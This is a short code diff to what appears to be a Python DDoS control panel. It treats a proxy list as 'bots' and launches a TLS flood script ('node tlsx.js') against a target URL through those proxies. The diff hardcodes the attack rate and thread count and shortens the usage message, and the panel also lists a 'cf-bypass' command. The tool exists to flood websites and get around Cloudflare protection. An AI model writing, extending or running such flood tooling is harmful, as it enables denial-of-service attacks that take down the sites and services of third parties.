@@ -9,7 +9,7 @@ import sys
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
     
-proxys = open('proxies.txt').readlines()
+proxys = open('proxy.txt').readlines()
 bots = len(proxys)
 
 def ascii_vro():
@@ -261,12 +261,10 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                rate = cnc.split()[3]
-                thread = cnc.split()[4]
-                os.system(f'node tlsx.js {url} {time} {rate} {thread} proxy.txt')
+                os.system(f'node tlsx.js {url} {time} 32 10 proxy.txt')
             except IndexError:
-                print('Usage: https <url> <time> <rate> <thread>')
-                print('Example: https http://example.com 60 32 10')
+                print('Usage: https <url> <time>')
+                print('Example: https http://example.com 60')
 
         elif "cf-bypass" in cnc:
             try:
